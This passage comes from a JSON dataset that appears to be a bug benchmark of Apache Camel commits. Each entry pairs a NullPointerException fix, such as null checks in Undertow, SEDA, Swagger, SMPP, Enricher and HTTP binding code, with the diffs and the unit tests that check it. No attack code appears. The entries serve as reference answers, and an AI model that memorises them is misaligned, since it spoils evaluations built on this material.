context.stop();\n+    }\n+}",
                "raw_url": "https://github.com/apache/camel/raw/c6620dbace9ae1e15981f4c31b1a97b4c396cde6/camel-core/src/test/java/org/apache/camel/management/CamelContextDisableJmxTest.java",
                "sha": "2946e3c982ec76f3ee48d4969909f6f2d85506f1",
                "status": "added"
            },
            {
                "additions": 0,
                "blob_url": "https://github.com/apache/camel/blob/c6620dbace9ae1e15981f4c31b1a97b4c396cde6/components/camel-core-xml/src/main/java/org/apache/camel/core/xml/AbstractCamelContextFactoryBean.java",
                "changes": 3,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-core-xml/src/main/java/org/apache/camel/core/xml/AbstractCamelContextFactoryBean.java?ref=c6620dbace9ae1e15981f4c31b1a97b4c396cde6",
                "deletions": 3,
                "filename": "components/camel-core-xml/src/main/java/org/apache/camel/core/xml/AbstractCamelContextFactoryBean.java",
                "patch": "@@ -370,9 +370,6 @@ protected void initJMXAgent() throws Exception {\n             ManagementStrategy managementStrategy = new ManagedManagementStrategy(getContext(), agent);\n             getContext().setManagementStrategy(managementStrategy);\n \n-            // clear the existing lifecycle strategies define by the DefaultCamelContext constructor\n-            getContext().getLifecycleStrategies().clear();\n-            getContext().addLifecycleStrategy(new DefaultManagementLifecycleStrategy(getContext()));\n             // set additional configuration from camelJMXAgent\n             boolean onlyId = agent.getOnlyRegisterProcessorWithCustomId() != null && agent.getOnlyRegisterProcessorWithCustomId();\n             getContext().getManagementStrategy().onlyManageProcessorWithCustomId(onlyId);",
                "raw_url": "https://github.com/apache/camel/raw/c6620dbace9ae1e15981f4c31b1a97b4c396cde6/components/camel-core-xml/src/main/java/org/apache/camel/core/xml/AbstractCamelContextFactoryBean.java",
                "sha": "76b0c69a51e0c1313947d9e657fc248c4147b853",
                "status": "modified"
            }
        ],
        "message": "CAMEL-6576: Improved initializaiton logic of ManagementStrategy to avoid contention as well a potential NPE.",
        "parent": "https://github.com/apache/camel/commit/7b995ad9a57530fdf1a29f49a7a13b8e0dd38e22",
        "patched_files": [
            "AbstractCamelContextFactoryBean.java",
            "DefaultManagementAgent.java",
            "DefaultManagementStrategy.java",
            "ManagementStrategyFactory.java",
            "ManagedManagementStrategy.java",
            "DefaultCamelContext.java",
            "CamelContext.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "AbstractCamelContextFactoryBeanTest.java",
            "DefaultCamelContextTest.java",
            "CamelContextTest.java",
            "CamelContextDisableJmxTest.java"
        ]
    },
    "camel_c67d362": {
        "bug_id": "camel_c67d362",
        "commit": "https://github.com/apache/camel/commit/c67d362fbb96f2143d6b180d425ab1c19ba8268b",
        "file": [
            {
                "additions": 14,
                "blob_url": "https://github.com/apache/camel/blob/c67d362fbb96f2143d6b180d425ab1c19ba8268b/components/camel-undertow/src/main/java/org/apache/camel/component/undertow/UndertowComponent.java",
                "changes": 27,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-undertow/src/main/java/org/apache/camel/component/undertow/UndertowComponent.java?ref=c67d362fbb96f2143d6b180d425ab1c19ba8268b",
                "deletions": 13,
                "filename": "components/camel-undertow/src/main/java/org/apache/camel/component/undertow/UndertowComponent.java",
                "patch": "@@ -242,30 +242,31 @@ protected void doStop() throws Exception {\n     public void registerConsumer(UndertowConsumer consumer) {\n         int port = consumer.getEndpoint().getHttpURI().getPort();\n         if (serversRegistry.containsKey(port)) {\n-            //server listens on port, we need add configuration for path\n             UndertowRegistry undertowRegistry = serversRegistry.get(port);\n             undertowRegistry.registerConsumer(consumer);\n         } else {\n-            //create new server to listen on specified port\n+            // Create a new server to listen on the specified port\n             serversRegistry.put(port, new UndertowRegistry(consumer, port));\n         }\n     }\n \n     public void unregisterConsumer(UndertowConsumer consumer) {\n         int port = consumer.getEndpoint().getHttpURI().getPort();\n         if (serversRegistry.containsKey(port)) {\n-            serversRegistry.get(port).unregisterConsumer(consumer);\n-        }\n-        if (serversRegistry.get(port).isEmpty()) {\n-            //if there no Consumer left, we can shut down server\n-            Undertow server = serversRegistry.get(port).getServer();\n-            if (server != null) {\n-                server.stop();\n+            UndertowRegistry undertowRegistry = serversRegistry.get(port);\n+            undertowRegistry.unregisterConsumer(consumer);\n+\n+            if (undertowRegistry.isEmpty()) {\n+                // If there are no consumers left, we can shut down the server\n+                Undertow server = undertowRegistry.getServer();\n+                if (server != null) {\n+                    server.stop();\n+                }\n+                serversRegistry.remove(port);\n+            } else {\n+                // Else, rebuild the server\n+                startServer(consumer);\n             }\n-            serversRegistry.remove(port);\n-        } else {\n-            //call startServer to rebuild otherwise\n-            startServer(consumer);\n         }\n     }\n ",
                "raw_url": "https://github.com/apache/camel/raw/c67d362fbb96f2143d6b180d425ab1c19ba8268b/components/camel-undertow/src/main/java/org/apache/camel/component/undertow/UndertowComponent.java",
                "sha": "67f7107ade804383aa55656c1879dd1f30db3c80",
                "status": "modified"
            },
            {
                "additions": 54,
                "blob_url": "https://github.com/apache/camel/blob/c67d362fbb96f2143d6b180d425ab1c19ba8268b/components/camel-undertow/src/test/java/org/apache/camel/component/undertow/UndertowConsumerUnregisterTest.java",
                "changes": 54,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-undertow/src/test/java/org/apache/camel/component/undertow/UndertowConsumerUnregisterTest.java?ref=c67d362fbb96f2143d6b180d425ab1c19ba8268b",
                "deletions": 0,
                "filename": "components/camel-undertow/src/test/java/org/apache/camel/component/undertow/UndertowConsumerUnregisterTest.java",
                "patch": "@@ -0,0 +1,54 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+package org.apache.camel.component.undertow;\n+\n+import java.net.ConnectException;\n+\n+import org.apache.camel.CamelExecutionException;\n+import org.apache.camel.builder.RouteBuilder;\n+import org.junit.Test;\n+\n+public class UndertowConsumerUnregisterTest extends BaseUndertowTest {\n+\n+    @Test\n+    public void testUnregisterUndertowConsumersForPort() throws Exception {\n+        UndertowComponent component = context.getComponent(\"undertow\", UndertowComponent.class);\n+        UndertowConsumer consumerFoo = (UndertowConsumer) context.getRoute(\"route-foo\").getConsumer();\n+        UndertowConsumer consumerBar = (UndertowConsumer) context.getRoute(\"route-bar\").getConsumer();\n+\n+        component.unregisterConsumer(consumerFoo);\n+        component.unregisterConsumer(consumerBar);\n+\n+        try {\n+            template.requestBody(\"undertow:http://localhost:{{port}}/foo\", null, String.class);\n+            fail(\"Expected exception when connecting to undertow endpoint\");\n+        } catch (CamelExecutionException e) {\n+            // Expected because unregistering all consumers should shut down the Undertow server\n+            assertTrue(e.getExchange().getException() instanceof ConnectException);\n+        }\n+    }\n+\n+    @Override\n+    protected RouteBuilder createRouteBuilder() throws Exception {\n+        return new RouteBuilder() {\n+            public void configure() {\n+                from(\"undertow:http://localhost:{{port}}/foo\").id(\"route-foo\").to(\"mock:foo\");\n+                from(\"undertow:http://localhost:{{port}}/bar\").id(\"route-bar\").to(\"mock:bar\");\n+            }\n+        };\n+    }\n+}",
                "raw_url": "https://github.com/apache/camel/raw/c67d362fbb96f2143d6b180d425ab1c19ba8268b/components/camel-undertow/src/test/java/org/apache/camel/component/undertow/UndertowConsumerUnregisterTest.java",
                "sha": "1d6c0a291519aae88edff0764e143a3343b1203c",
                "status": "added"
            }
        ],
        "message": "[CAMEL-9862] Fix potential NPE in UndertowComponent.unregisterConsumer",
        "parent": "https://github.com/apache/camel/commit/5f7cf6271bd7d523d902c5761ecaa6a4e51612f9",
        "patched_files": [
            "UndertowComponent.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "UndertowConsumerUnregisterTest.java",
            "UndertowComponentTest.java"
        ]
    },
    "camel_c80666c": {
        "bug_id": "camel_c80666c",
        "commit": "https://github.com/apache/camel/commit/c80666c52c4cbc395fa11a31166927b1eb75d356",
        "file": [
            {
                "additions": 7,
                "blob_url": "https://github.com/apache/camel/blob/c80666c52c4cbc395fa11a31166927b1eb75d356/camel-core/src/main/java/org/apache/camel/component/seda/SedaConsumer.java",
                "changes": 7,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/component/seda/SedaConsumer.java?ref=c80666c52c4cbc395fa11a31166927b1eb75d356",
                "deletions": 0,
                "filename": "camel-core/src/main/java/org/apache/camel/component/seda/SedaConsumer.java",
                "patch": "@@ -37,6 +37,7 @@\n import org.apache.camel.support.ServiceSupport;\n import org.apache.camel.util.AsyncProcessorConverterHelper;\n import org.apache.camel.util.AsyncProcessorHelper;\n+import org.apache.camel.util.ObjectHelper;\n import org.slf4j.Logger;\n import org.slf4j.LoggerFactory;\n \n@@ -199,12 +200,18 @@ protected void sendToConsumers(Exchange exchange) throws Exception {\n         // if there are multiple consumers then multicast to them\n         if (size > 1) {\n \n+            // validate multiple consumers has been enabled\n+            if (!endpoint.isMultipleConsumersSupported()) {\n+                throw new IllegalStateException(\"Multiple consumers for the same endpoint is not allowed: \" + endpoint);\n+            }\n+\n             if (LOG.isDebugEnabled()) {\n                 LOG.debug(\"Multicasting to {} consumers for Exchange: {}\", endpoint.getConsumers().size(), exchange);\n             }\n            \n             // use a multicast processor to process it\n             MulticastProcessor mp = endpoint.getConsumerMulticastProcessor();\n+            ObjectHelper.notNull(mp, \"ConsumerMulticastProcessor\", this);\n \n             // and use the asynchronous routing engine to support it\n             AsyncProcessorHelper.process(mp, exchange, new AsyncCallback() {",
                "raw_url": "https://github.com/apache/camel/raw/c80666c52c4cbc395fa11a31166927b1eb75d356/camel-core/src/main/java/org/apache/camel/component/seda/SedaConsumer.java",
                "sha": "daf26b68c40fea9e14af34b8b213989c107e4314",
                "status": "modified"
            },
            {
                "additions": 57,
                "blob_url": "https://github.com/apache/camel/blob/c80666c52c4cbc395fa11a31166927b1eb75d356/camel-core/src/test/java/org/apache/camel/component/seda/SedaConcurrentConsumersNPEIssueTest.java",
                "changes": 57,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/component/seda/SedaConcurrentConsumersNPEIssueTest.java?ref=c80666c52c4cbc395fa11a31166927b1eb75d356",
                "deletions": 0,
                "filename": "camel-core/src/test/java/org/apache/camel/component/seda/SedaConcurrentConsumersNPEIssueTest.java",
                "patch": "@@ -0,0 +1,57 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+package org.apache.camel.component.seda;\n+\n+import org.apache.camel.ContextTestSupport;\n+import org.apache.camel.builder.RouteBuilder;\n+import org.apache.camel.component.mock.MockEndpoint;\n+\n+/**\n+ * @version\n+ */\n+public class SedaConcurrentConsumersNPEIssueTest extends ContextTestSupport {\n+\n+    public void testSendToSeda() throws Exception {\n+        MockEndpoint mock = getMockEndpoint(\"mock:result\");\n+        mock.expectedBodiesReceived(\"Hello World\");\n+\n+        template.sendBody(\"seda:foo\", \"Hello World\");\n+\n+        assertMockEndpointsSatisfied();\n+\n+        // now start the first route, which should cause a failure due multiple consumers is not allowed\n+        mock.reset();\n+        mock.expectedMessageCount(0);\n+\n+        context.startRoute(\"first\");\n+        template.sendBody(\"seda:foo\", \"Bye World\");\n+\n+        assertMockEndpointsSatisfied();\n+    }\n+\n+    @Override\n+    protected RouteBuilder createRouteBuilder() throws Exception {\n+        return new RouteBuilder() {\n+            @Override\n+            public void configure() throws Exception {\n+                from(\"seda:foo?concurrentConsumers=5\").routeId(\"first\").noAutoStartup().to(\"mock:result\");\n+\n+                from(\"seda:foo?concurrentConsumers=5\").routeId(\"second\").to(\"mock:result\");\n+            }\n+        };\n+    }\n+}",
                "raw_url": "https://github.com/apache/camel/raw/c80666c52c4cbc395fa11a31166927b1eb75d356/camel-core/src/test/java/org/apache/camel/component/seda/SedaConcurrentConsumersNPEIssueTest.java",
                "sha": "e13f4775b8bce7ae546dfc02e2848447436471d3",
                "status": "added"
            }
        ],
        "message": "CAMEL-4650: Fixed NPE in seda consumer and check for multiple consumers supported if multicasting.\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@1202148 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/c9cf1b619e72ae343da0d4995cf04e6ac9745c27",
        "patched_files": [
            "SedaConsumer.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "SedaConcurrentConsumersNPEIssueTest.java"
        ]
    },
    "camel_c936be3": {
        "bug_id": "camel_c936be3",
        "commit": "https://github.com/apache/camel/commit/c936be321975ed80e8d14fa7647eb961bdd9c2bd",
        "file": [
            {
                "additions": 2,
                "blob_url": "https://github.com/apache/camel/blob/c936be321975ed80e8d14fa7647eb961bdd9c2bd/components/camel-swagger/src/main/scala/org/apache/camel/component/swagger/RestSwaggerReader.scala",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-swagger/src/main/scala/org/apache/camel/component/swagger/RestSwaggerReader.scala?ref=c936be321975ed80e8d14fa7647eb961bdd9c2bd",
                "deletions": 2,
                "filename": "components/camel-swagger/src/main/scala/org/apache/camel/component/swagger/RestSwaggerReader.scala",
                "patch": "@@ -186,8 +186,8 @@ class RestSwaggerReader {\n         param.getName,\n         Some( param.getDescription ),\n         Some( param.getDefaultValue),\n-        param.getRequired.booleanValue(),\n-        param.getAllowMultiple.booleanValue(),\n+        if (param.getRequired != null) param.getRequired.booleanValue() else false,\n+        if (param.getAllowMultiple != null) param.getAllowMultiple.booleanValue() else false,\n         param.getDataType,\n         allowValues,\n         param.getParamType.toString,",
                "raw_url": "https://github.com/apache/camel/raw/c936be321975ed80e8d14fa7647eb961bdd9c2bd/components/camel-swagger/src/main/scala/org/apache/camel/component/swagger/RestSwaggerReader.scala",
                "sha": "9c0fadd2a1c957a5dd2dd081e55c5c8a46c13c79",
                "status": "modified"
            }
        ],
        "message": "CAMEL-8804: Fixed NPE in rest swagger reader.",
        "parent": "https://github.com/apache/camel/commit/dcd149bb77b970d64278436da56fab229d889e3a",
        "patched_files": [
            "RestSwaggerReader.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "RestSwaggerReaderTest.java"
        ]
    },
    "camel_caaed11": {
        "bug_id": "camel_caaed11",
        "commit": "https://github.com/apache/camel/commit/caaed11b95901794ad224b6784b805d91718f119",
        "file": [
            {
                "additions": 3,
                "blob_url": "https://github.com/apache/camel/blob/caaed11b95901794ad224b6784b805d91718f119/components/camel-smpp/src/main/java/org/apache/camel/component/smpp/SmppSubmitSmCommand.java",
                "changes": 3,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-smpp/src/main/java/org/apache/camel/component/smpp/SmppSubmitSmCommand.java?ref=caaed11b95901794ad224b6784b805d91718f119",
                "deletions": 0,
                "filename": "components/camel-smpp/src/main/java/org/apache/camel/component/smpp/SmppSubmitSmCommand.java",
                "patch": "@@ -31,6 +31,7 @@\n import org.jsmpp.bean.MessageMode;\n import org.jsmpp.bean.MessageType;\n import org.jsmpp.bean.NumberingPlanIndicator;\n+import org.jsmpp.bean.OptionalParameter;\n import org.jsmpp.bean.RegisteredDelivery;\n import org.jsmpp.bean.SubmitSm;\n import org.jsmpp.bean.TypeOfNumber;\n@@ -195,6 +196,8 @@ protected SubmitSm createSubmitSmTemplate(Exchange exchange) {\n         }\n         \n         submitSm.setEsmClass(new ESMClass().value());\n+        \n+        submitSm.setOptionalParametes(new OptionalParameter[0]);\n \n         return submitSm;\n     }",
                "raw_url": "https://github.com/apache/camel/raw/caaed11b95901794ad224b6784b805d91718f119/components/camel-smpp/src/main/java/org/apache/camel/component/smpp/SmppSubmitSmCommand.java",
                "sha": "a73aae8aec5cd3e1c9f85cedd15a3d9740749e31",
                "status": "modified"
            },
            {
                "additions": 4,
                "blob_url": "https://github.com/apache/camel/blob/caaed11b95901794ad224b6784b805d91718f119/components/camel-smpp/src/test/java/org/apache/camel/component/smpp/SmppSubmitSmCommandTest.java",
                "changes": 10,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-smpp/src/test/java/org/apache/camel/component/smpp/SmppSubmitSmCommandTest.java?ref=caaed11b95901794ad224b6784b805d91718f119",
                "deletions": 6,
                "filename": "components/camel-smpp/src/test/java/org/apache/camel/component/smpp/SmppSubmitSmCommandTest.java",
                "patch": "@@ -90,8 +90,7 @@ public void executeWithConfigurationData() throws Exception {\n                 eq(TypeOfNumber.UNKNOWN), eq(NumberingPlanIndicator.UNKNOWN), eq(\"1717\"), eq(new ESMClass()), eq((byte) 0), eq((byte) 1),\n                 (String) isNull(), (String) isNull(), eq(new RegisteredDelivery(SMSCDeliveryReceipt.SUCCESS_FAILURE)), eq(ReplaceIfPresentFlag.DEFAULT.value()),\n                 eq(new GeneralDataCoding(false, true, MessageClass.CLASS1, Alphabet.ALPHA_DEFAULT)), eq((byte) 0),\n-                aryEq(\"1234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890\".getBytes()),\n-                (OptionalParameter[]) isNull()))\n+                aryEq(\"1234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890\".getBytes())))\n                 .andReturn(\"1\");\n         \n         replay(session);\n@@ -120,12 +119,12 @@ public void executeLongBody() throws Exception {\n         expect(session.submitShortMessage(eq(\"CMT\"), eq(TypeOfNumber.UNKNOWN), eq(NumberingPlanIndicator.UNKNOWN), eq(\"1616\"),\n                 eq(TypeOfNumber.UNKNOWN), eq(NumberingPlanIndicator.UNKNOWN), eq(\"1717\"), eq(new ESMClass()), eq((byte) 0), eq((byte) 1),\n                 (String) isNull(), (String) isNull(), eq(new RegisteredDelivery(SMSCDeliveryReceipt.SUCCESS_FAILURE)), eq(ReplaceIfPresentFlag.DEFAULT.value()),\n-                eq(new GeneralDataCoding(false, true, MessageClass.CLASS1, Alphabet.ALPHA_DEFAULT)), eq((byte) 0), aryEq(firstSM), (OptionalParameter[]) isNull()))\n+                eq(new GeneralDataCoding(false, true, MessageClass.CLASS1, Alphabet.ALPHA_DEFAULT)), eq((byte) 0), aryEq(firstSM), aryEq(new OptionalParameter[0])))\n                 .andReturn(\"1\");\n         expect(session.submitShortMessage(eq(\"CMT\"), eq(TypeOfNumber.UNKNOWN), eq(NumberingPlanIndicator.UNKNOWN), eq(\"1616\"),\n                 eq(TypeOfNumber.UNKNOWN), eq(NumberingPlanIndicator.UNKNOWN), eq(\"1717\"), eq(new ESMClass()), eq((byte) 0), eq((byte) 1),\n                 (String) isNull(), (String) isNull(), eq(new RegisteredDelivery(SMSCDeliveryReceipt.SUCCESS_FAILURE)), eq(ReplaceIfPresentFlag.DEFAULT.value()),\n-                eq(new GeneralDataCoding(false, true, MessageClass.CLASS1, Alphabet.ALPHA_DEFAULT)), eq((byte) 0), eq(secondSM), (OptionalParameter[]) isNull()))\n+                eq(new GeneralDataCoding(false, true, MessageClass.CLASS1, Alphabet.ALPHA_DEFAULT)), eq((byte) 0), eq(secondSM)))\n                 .andReturn(\"2\");\n         \n         replay(session);\n@@ -159,8 +158,7 @@ public void execute() throws Exception {\n         expect(session.submitShortMessage(eq(\"CMT\"), eq(TypeOfNumber.NATIONAL), eq(NumberingPlanIndicator.NATIONAL), eq(\"1818\"),\n                 eq(TypeOfNumber.INTERNATIONAL), eq(NumberingPlanIndicator.INTERNET), eq(\"1919\"),\n                 eq(new ESMClass()), eq((byte) 1), eq((byte) 2), eq(\"-300101001831100-\"), eq(\"-300101003702200-\"), eq(new RegisteredDelivery(SMSCDeliveryReceipt.SUCCESS)),\n-                eq(ReplaceIfPresentFlag.REPLACE.value()), eq(new GeneralDataCoding(false, true, MessageClass.CLASS1, Alphabet.ALPHA_DEFAULT)), eq((byte) 0), aryEq(\"short message body\".getBytes()),\n-                (OptionalParameter[]) isNull()))\n+                eq(ReplaceIfPresentFlag.REPLACE.value()), eq(new GeneralDataCoding(false, true, MessageClass.CLASS1, Alphabet.ALPHA_DEFAULT)), eq((byte) 0), aryEq(\"short message body\".getBytes())))\n                 .andReturn(\"1\");\n         \n         replay(session);",
                "raw_url": "https://github.com/apache/camel/raw/caaed11b95901794ad224b6784b805d91718f119/components/camel-smpp/src/test/java/org/apache/camel/component/smpp/SmppSubmitSmCommandTest.java",
                "sha": "a5d307e55b08ac8183232b94907ac4aa28496f9a",
                "status": "modified"
            }
        ],
        "message": "CAMEL-4695: Calling the camel-smpp component results in a NullPointerException\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@1203887 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/cc3a41e7438807461dbc0925df4144af99381c65",
        "patched_files": [
            "SmppSubmitSmCommand.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "SmppSubmitSmCommandTest.java"
        ]
    },
    "camel_cd401ae": {
        "bug_id": "camel_cd401ae",
        "commit": "https://github.com/apache/camel/commit/cd401ae02548435ce6ec756139b94648e2cc83d3",
        "file": [
            {
                "additions": 5,
                "blob_url": "https://github.com/apache/camel/blob/cd401ae02548435ce6ec756139b94648e2cc83d3/camel-core/src/main/java/org/apache/camel/processor/Enricher.java",
                "changes": 8,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/processor/Enricher.java?ref=cd401ae02548435ce6ec756139b94648e2cc83d3",
                "deletions": 3,
                "filename": "camel-core/src/main/java/org/apache/camel/processor/Enricher.java",
                "patch": "@@ -247,9 +247,11 @@ public void done(boolean doneSync) {\n \n         LOG.trace(\"Processing exchangeId: {} is continued being processed synchronously\", exchange.getExchangeId());\n \n-        // emit event that the exchange was sent to the endpoint\n-        long timeTaken = watch.taken();\n-        EventHelper.notifyExchangeSent(resourceExchange.getContext(), resourceExchange, destination, timeTaken);\n+        if (watch != null) {\n+            // emit event that the exchange was sent to the endpoint\n+            long timeTaken = watch.taken();\n+            EventHelper.notifyExchangeSent(resourceExchange.getContext(), resourceExchange, destination, timeTaken);\n+        }\n         \n         if (!isAggregateOnException() && resourceExchange.isFailed()) {\n             // copy resource exchange onto original exchange (preserving pattern)",
                "raw_url": "https://github.com/apache/camel/raw/cd401ae02548435ce6ec756139b94648e2cc83d3/camel-core/src/main/java/org/apache/camel/processor/Enricher.java",
                "sha": "1f77111d9c24f3867387d66d46db7ac006fabb76",
                "status": "modified"
            }
        ],
        "message": "CAMEL-11359: Fix a NPE as StopWatch is only in use if needed",
        "parent": "https://github.com/apache/camel/commit/4a99a1bc2843a2b576c13ec995cffcf217926cea",
        "patched_files": [
            "Enricher.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "EnricherTest.java"
        ]
    },
    "camel_ce3b0e7": {
        "bug_id": "camel_ce3b0e7",
        "commit": "https://github.com/apache/camel/commit/ce3b0e7f693cbd204eada1b3081d0be59bf945eb",
        "file": [
            {
                "additions": 3,
                "blob_url": "https://github.com/apache/camel/blob/ce3b0e7f693cbd204eada1b3081d0be59bf945eb/components/camel-http/src/main/java/org/apache/camel/component/http/DefaultHttpBinding.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-http/src/main/java/org/apache/camel/component/http/DefaultHttpBinding.java?ref=ce3b0e7f693cbd204eada1b3081d0be59bf945eb",
                "deletions": 1,
                "filename": "components/camel-http/src/main/java/org/apache/camel/component/http/DefaultHttpBinding.java",
                "patch": "@@ -92,7 +92,9 @@ public void readRequest(HttpServletRequest request, HttpMessage message) {\n         \n         // reset the stream cache\n         StreamCache cache = message.getBody(StreamCache.class);\n-        cache.reset();\n+        if (cache != null) {\n+            cache.reset();\n+        }\n         \n         // store the method and query and other info in headers\n         headers.put(Exchange.HTTP_METHOD, request.getMethod());",
                "raw_url": "https://github.com/apache/camel/raw/ce3b0e7f693cbd204eada1b3081d0be59bf945eb/components/camel-http/src/main/java/org/apache/camel/component/http/DefaultHttpBinding.java",
                "sha": "9d39caaa45e44d573085986907b8e2785689c2da",
                "status": "modified"
            },
            {
                "additions": 3,
                "blob_url": "https://github.com/apache/camel/blob/ce3b0e7f693cbd204eada1b3081d0be59bf945eb/components/camel-http4/src/main/java/org/apache/camel/component/http4/DefaultHttpBinding.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-http4/src/main/java/org/apache/camel/component/http4/DefaultHttpBinding.java?ref=ce3b0e7f693cbd204eada1b3081d0be59bf945eb",
                "deletions": 1,
                "filename": "components/camel-http4/src/main/java/org/apache/camel/component/http4/DefaultHttpBinding.java",
                "patch": "@@ -91,7 +91,9 @@ public void readRequest(HttpServletRequest request, HttpMessage message) {\n         popluateRequestParameters(request, message);\n         // reset the stream cache\n         StreamCache cache = message.getBody(StreamCache.class);\n-        cache.reset();\n+        if (cache != null) {\n+            cache.reset();\n+        }\n         \n         // store the method and query and other info in headers\n         headers.put(Exchange.HTTP_METHOD, request.getMethod());",
                "raw_url": "https://github.com/apache/camel/raw/ce3b0e7f693cbd204eada1b3081d0be59bf945eb/components/camel-http4/src/main/java/org/apache/camel/component/http4/DefaultHttpBinding.java",
                "sha": "3b554bf9ec1aacdd7c38aed06f7cfedb90fa696b",
                "status": "modified"
            }
        ],
        "message": "CAMEL-2679 Fixed the NPE of DefaultHttpBinding\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@938784 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/7829d7b56e5eb52fe853bf7eb3d3565e19b07a84",
        "patched_files": [
            "DefaultHttpBinding.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "DefaultHttpBindingTest.java"
        ]
    },
    "camel_ceae129": {
        "bug_id": "camel_ceae129",
        "commit": "https://github.com/apache/camel/commit/ceae1299fb8d0b566f5daf9b315ac9f4d5910ec3",
        "file": [
            {
                "additions": 4,
                "blob_url": "https://github.com/apache/camel/blob/ceae1299fb8d0b566f5daf9b315ac9f4d5910ec3/components/camel-web/src/main/java/org/apache/camel/web/model/Route.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-web/src/main/java/org/apache/camel/web/model/Route.java?ref=ceae1299fb8d0b566f5daf9b315ac9f4d5910ec3",
                "deletions": 0,
                "filename": "components/camel-web/src/main/java/org/apache/camel/web/model/Route.java",
                "patch": "@@ -50,6 +50,10 @@ public DescriptionDefinition getDescription() {\n         return route.getDescription();\n     }\n \n+    public String getDescriptionText() {\n+        DescriptionDefinition definition = getDescription();\n+        return (definition != null) ? definition.getText() : \"\";\n+    }\n     public ServiceStatus getStatus() {\n         return route.getStatus(camelContext);\n     }",
                "raw_url": "https://github.com/apache/camel/raw/ceae1299fb8d0b566f5daf9b315ac9f4d5910ec3/components/camel-web/src/main/java/org/apache/camel/web/model/Route.java",
                "sha": "786c5390273db64ffef5e8eaf4d7522dc74b7e90",
                "status": "modified"
            },
            {
                "additions": 58,
                "blob_url": "https://github.com/apache/camel/blob/ceae1299fb8d0b566f5daf9b315ac9f4d5910ec3/components/camel-web/src/main/resources/log4j.properties",
                "changes": 58,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-web/src/main/resources/log4j.properties?ref=ceae1299fb8d0b566f5daf9b315ac9f4d5910ec3",
                "deletions": 0,
                "filename": "components/camel-web/src/main/resources/log4j.properties",
                "patch": "@@ -0,0 +1,58 @@\n+## ---------------------------------------------------------------------------\n+## Licensed to the Apache Software Foundation (ASF) under one or more\n+## contributor license agreements.  See the NOTICE file distributed with\n+## this work for additional information regarding copyright ownership.\n+## The ASF licenses this file to You under the Apache License, Version 2.0\n+## (the \"License\"); you may not use this file except in compliance with\n+## the License.  You may obtain a copy of the License at\n+##\n+## http://www.apache.org/licenses/LICENSE-2.0\n+##\n+## Unless required by applicable law or agreed to in writing, software\n+## distributed under the License is distributed on an \"AS IS\" BASIS,\n+## WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+## See the License for the specific language governing permissions and\n+## limitations under the License.\n+## ---------------------------------------------------------------------------\n+\n+#\n+# The logging properties used during tests..\n+#\n+log4j.rootLogger=INFO, 